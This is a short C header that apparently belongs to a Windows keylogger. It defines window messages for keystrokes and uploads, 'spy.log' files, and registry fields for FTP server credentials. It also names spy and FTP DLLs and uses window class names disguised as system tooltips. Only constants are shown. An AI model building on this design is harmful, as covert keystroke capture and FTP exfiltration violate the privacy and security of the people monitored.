// Written by Dor Alon 2005
//

//User defined Window Messages
UINT MSG_MY_WM_KEYDOWN =  RegisterWindowMessage("WM_KEYDOWN_STR");
UINT MSG_MY_WM_SETFOCUS = RegisterWindowMessage("WM_SETFOCUS_STR");
UINT MSG_WM_UPLOAD_FILE = RegisterWindowMessage("WM_UPLOAD_FILE_STR");

#define COMM_WIN_CLASS      "tooltips_class32.asdad"
#define SPY_WIN_CLASS       "tooltips_class32_asdasd"
#define LOG_FILE            "spy.log"
#define LOG_FILE2           "spy2.log"
#define NO_UPLOAD           1
#define UPLOADING           2
#define SPY_REG_KEY         "SOFTWARE\\Dor Alon Software"
#define REG_FTP_FILE        "FTP File"
#define REG_FTP_URL         "FTP URL"
#define REG_FTP_PORT        "FTP Port"
#define REG_FTP_USER        "FTP User"
#define REG_FTP_PASSWORD    "FTP Password"
#define MAX_SIZE_OF_LOG     1024*64 
#define CHECK_LOG_SIZE_TIME 1000*60*5
#define FTP_DLL_NAME        "ftpdll.dll"
#define SPY_DLL_NAME        "spydll.dll"
